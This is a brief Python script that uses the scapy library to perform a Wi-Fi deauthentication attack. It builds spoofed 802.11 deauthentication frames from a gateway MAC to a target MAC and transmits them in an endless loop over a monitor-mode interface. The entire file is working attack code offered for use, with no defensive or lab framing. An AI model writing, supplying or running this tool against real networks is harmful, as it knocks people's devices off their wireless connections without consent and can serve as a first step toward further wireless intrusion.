from scapy.all import *

def deauthentication_attack(target_mac, gateway_mac, iface="wlan0"):
    """
    Performs a deauthentication attack against a target device.

    Args:
        target_mac: The MAC address of the target device.
        gateway_mac: The MAC address of the gateway.
        iface: The wireless interface to use for the attack.
    """
    print("[*] Performing deauthentication attack...")
    print(f"[*] Target: {target_mac}")
    print(f"[*] Gateway: {gateway_mac}")
    print(f"[*] Interface: {iface}")
    print("[!] Note: This feature requires root access and a wireless card that supports monitor mode.")

    # Craft the deauthentication packet
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)

    # Send the packet in a loop
    try:
        while True:
            sendp(packet, iface=iface, count=100, inter=.001, verbose=0)
    except KeyboardInterrupt:
        print("\n[*] Deauthentication attack stopped.")
